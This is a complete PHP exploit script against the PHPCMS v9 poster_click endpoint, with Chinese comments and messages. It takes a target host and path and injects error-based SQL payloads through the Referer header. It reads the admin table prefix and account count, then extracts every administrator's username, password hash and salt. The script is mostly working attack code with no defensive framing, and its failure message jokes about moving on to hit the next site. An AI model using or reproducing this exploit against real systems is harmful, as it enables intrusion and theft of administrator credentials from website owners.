<?php

print_r('
+------------------------------------------------------+
             PHPCMS_V9 poster_click 注入EXP
             
+------------------------------------------------------+
');
if ($argc < 3) {
    print_r('
+------------------------------------------------------+
Useage: php ' . $argv[0] . ' host path
Host: target server (ip/hostname)
Path: path of phpcms
Example: php ' . $argv[0] . ' localhost /phpcms
+------------------------------------------------------+
    ');
    exit;
}
error_reporting(7);

//统计时间
$start_time = func_time();
$host = $argv[1];
$path = $argv[2];
//取得管理员个数
$cmd1 = "Referer: ' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,count(*),0x23) FROM v9_admin)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1";
//echo send_pack($cmd1);
if (preg_match('/MySQL Query/', send_pack($cmd1))) {
    //取得管理员表前缀
    preg_match('/\.`(.*?)_poster/', send_pack($cmd1), $prefix_match);
    $tableadmin = $prefix_match[1] . '_admin';
    //取得管理员个数
    $cmd2 = "Referer: ' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,count(*),0x23) FROM $tableadmin)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1";
    preg_match('/\'#(\d+)#1/U', send_pack($cmd2), $num_match);
    $count = $num_match[1];
    echo '共有' . $count . '个管理员' . "\n";
    //取得管理员用户名及数据
    if (preg_match('/Duplicate/', send_pack($cmd2))) {
        foreach (range(0, ($count - 1)) as $i) {
            $payload = "Referer: ' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x3a,encrypt,0x23) FROM $tableadmin Order by userid LIMIT $i,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1";
            preg_match('/\'#(.*)#1/U', send_pack($payload), $admin_match);
            if (preg_match('/charset=utf-8/', send_pack($payload))) {
                echo $i . '-->' . iconv('utf-8', 'gbk//IGNORE', $admin_match[1]) . "\n";
            } else {
                echo $i . '-->' . $admin_match[1] . "\n";
            }
            //echo $admin_match[1]. "\n";
            //echo iconv('utf-8', 'gbk//IGNORE', $admin_match[1]) . "\n";
            //echo mb_convert_encoding($admin_match[1],'gbk','auto')."\n";
        }
    }
} else {
    exit("报告大人，网站不存在此漏洞,你可以继续秒下一个!\n");
}
//提交数据包函数
function send_pack($cmd)
{
    global $host, $path;
    $data = "GET " . $path . "/index.php?m=poster&c=index&a=poster_click&sitespaceid=1&id=1 HTTP/1.1\r\n";
    $data .= "Host: " . $host . "\r\n";
    $data .= "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0\r\n";
    $data .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
    $data .= $cmd . "\r\n";
    $data .= "Accept-Language: zh-cn\r\n";
    $data .= "Connection: Close\r\n\r\n";
    //这里一定要2个\r\n否则将会一直等待并且不返回数据
    $fp = @fsockopen($host, 80, $errno, $errstr, 30);
    //echo ini_get('default_socket_timeout');//默认超时时间为60秒
    if (!$fp) {
        echo $errno . '-->' . $errstr;
        exit('Could not connect to: ' . $host);
    } else {
        fwrite($fp, $data);
        $back = '';
        while (!feof($fp)) {
            $back .= fread($fp, 1024);
        }
        fclose($fp);
    }
    return $back;
}

//时间统计函数
function func_time()
{
    list($microsec, $sec) = explode(' ', microtime());
    return $microsec + $sec;
}

echo '脚本执行时间：' . round((func_time() - $start_time), 4) . '秒。';

?>
